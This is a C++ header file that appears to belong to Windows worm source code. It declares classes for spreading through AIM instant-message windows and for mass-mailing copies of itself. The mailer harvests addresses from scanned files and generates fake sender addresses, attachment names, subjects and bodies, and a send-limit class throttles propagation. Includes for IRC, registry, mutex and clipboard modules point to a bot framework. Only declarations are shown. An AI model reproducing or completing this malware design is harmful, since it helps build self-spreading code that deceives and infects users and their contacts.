#pragma once

#include <windows.h>
#include "thread.h"
#include "file.h"
#include "childimage.h"
#include "irc.h"
#include "filescan.h"
#include "registry.h"
#include "config.h"
#include "smtp.h"
#include "mutex.h"
#include "clipboard.h"

class SendLimit
{
public:
	VOID Reset(VOID);
	VOID SetTimesToSend(UINT TimesToSend);

protected:
	SendLimit();
	~SendLimit();
	BOOL SendLimitExceeded(VOID);
	VOID WaitForChange(VOID);
	VOID Sent(VOID);

private:
	UINT TimesSent;
	UINT TimesToSend;
	HANDLE Event;
};

class AimSpread : public Thread, public SendLimit
{
public:
	AimSpread();
	AimSpread(UINT TimesToSend);

private:
	VOID ThreadFunc(VOID);
	static BOOL CALLBACK EnumIMs(HWND hWnd, LPARAM lParam);
	static BOOL CALLBACK EnumChildIMs(HWND hWnd, LPARAM lParam);
};

#ifndef NO_EMAIL_SPREAD
class EmailSpread : public FileScan, public SendLimit
{
public:
	EmailSpread();
	EmailSpread(UINT TimesToSend);
	~EmailSpread();

private:
	VOID PreScan(VOID);
	VOID Process(PCHAR FileName);
	VOID Send(PCHAR EmailAddress);
	PCHAR GenerateFromAddress(VOID);
	PCHAR GenerateAttachmentName(VOID);
	PCHAR GenerateSubject(VOID);
	PCHAR GenerateBody(VOID);

	PBYTE Buffer;
	UINT BufferSize;
	CHAR FromAddress[64];
	CHAR AttachmentName[64];
	CHAR Subject[64];
	CHAR Body[256];
};
#endif